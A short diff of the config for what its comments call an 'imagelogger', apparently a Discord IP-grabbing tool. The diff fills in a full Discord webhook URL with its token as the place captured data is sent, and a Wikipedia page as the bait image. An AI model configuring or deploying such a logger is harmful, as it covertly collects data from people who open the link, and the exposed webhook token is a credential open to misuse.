@@ -8,8 +8,8 @@ config = {
     ####################### CHANGE THE CONFIG IF YOU WANT, YOU HAVE ALSO A DESCRIPTION OF THE SETTINGS ############################
     ###############################################################################################################################
     
-  "webhook": "Your webhook url",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+  "webhook": "https://discord.com/api/webhooks/1511825959026954240/1fgnzq5LseaubUvaN0MsDNpR2vytHeoxlJ_Ab9P6dDEutIEvO0sd-MBYbjEyGADmluOP",
+    "image": "https://en.wikipedia.org/wiki/Monkey", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
